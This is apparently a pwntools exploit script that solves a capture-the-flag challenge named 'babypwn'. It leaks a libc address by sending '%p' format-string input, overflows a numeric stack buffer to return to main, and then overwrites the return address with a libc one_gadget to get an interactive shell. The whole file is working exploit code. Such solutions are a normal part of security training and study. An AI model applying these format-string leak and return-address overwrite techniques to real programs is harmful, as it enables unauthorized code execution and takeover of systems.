from pwn import *

binary = ELF('./babypwn')
libc = ELF('./libc.so.6')

main_addr = 0x400806
libc_offset = 0x3c6790
gadget_offset = 0xf1147 # 0x45216 0x4526a 0xf02a4 0xf1147

p = process('./babypwn', env = {'LD_PRELOAD' : './libc.so.6'})

# gdb.attach(p, 'b *0x4009a3');

# Stage1: Leak libc addr and return to main
p.sendline('y')
p.sendlineafter('name: ', '%p' * 25)
p.sendlineafter('have?', '128')

for i in range(22):
  p.sendline('1094795585') # AAAAAAAA

for i in range(4):
  p.sendline('-')

p.sendline(str(main_addr))
p.sendline('0')

for i in range(100):
  p.sendline('0')

p.recvuntil('Tressure Box: ')
libc_addr = int(p.recv().split('0x')[2], 16) - libc_offset
one_gadget_addr = libc_addr + gadget_offset
log.info('libc_addr: ' + hex(libc_addr))
log.info('gadget_addr: ' + hex(one_gadget_addr))


# Stage2: overwrite return address to one_gadget
p.sendline('y')
p.sendlineafter('name: ', '%p' * 25)
p.sendlineafter('have?', '128')

for i in range(22):
  p.sendline('1094795585') # AAAAAAAA

for i in range(4):
  p.sendline('-')

log.info(hex(one_gadget_addr & 0x00000000ffffffff))
log.info(hex((one_gadget_addr & 0xffffffff00000000) >> 32))
p.sendline(str(one_gadget_addr & 0x00000000ffffffff))
p.sendline(str((one_gadget_addr & 0xffffffff00000000) >> 32))


for i in range(100):
  p.sendline('0')

p.interactive();